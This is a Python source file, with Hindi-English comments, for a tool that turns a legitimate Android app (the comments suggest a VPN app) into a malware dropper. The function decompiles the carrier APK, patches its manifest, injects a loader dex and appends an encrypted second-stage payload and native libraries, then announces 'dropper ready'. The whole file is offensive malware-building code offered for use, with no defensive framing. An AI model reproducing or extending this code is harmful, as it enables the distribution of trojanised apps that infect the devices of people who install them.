import os
import shutil
import zipfile
from apktool_wrapper import decompile, recompile
from payload_injector import inject_payload


def wrap_as_dropper(input_apk: str, output_apk: str, session_dir: str,
                    payload_dex_or_apk: str = None):
    """
    Real dropper:
      input_apk     = carrier APK (VPN app, whatever)
      payload_dex_or_apk = second-stage dex (encrypted separately as .bin)
                          agar APK diya to .dex nikal lo pehle.
    """
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    # 1) rebuild host first so we have valid unsigned.apk with loader
    unsigned = os.path.join(session_dir, "host_unsigned.apk")

    # 2) prepare encrypted payload blob
    blob = os.path.join(session_dir, "p.bin")
    if payload_dex_or_apk and os.path.exists(payload_dex_or_apk):
        shutil.copy2(payload_dex_or_apk, blob)
    else:
        # placeholder — start() sirf return karega
        with open(blob, "wb") as f:
            f.write(b"\x00" * 16)

    # 3) patch manifest BEFORE recompile
    #    (inject_payload does the manifest write, but it needs recompiled apk too;
    #     so split: patch manifest now, recompile, then add dex/bin/libs)
    from payload_injector import _patch_manifest, _read_app_class, _build_loader_dex
    original_class = _read_app_class(decompiled)
    _build_loader_dex(original_class)
    _patch_manifest(decompiled)

    recompile(decompiled, unsigned)

    # 4) append classes2.dex + assets/p.bin + libs
    from payload_injector import _add_to_apk
    from config import LOADER_DEX, LOADER_SO_DIR
    _add_to_apk(unsigned, blob, LOADER_DEX, LOADER_SO_DIR)

    shutil.copy2(unsigned, output_apk)
    print(f"[✓] dropper ready → {output_apk}")
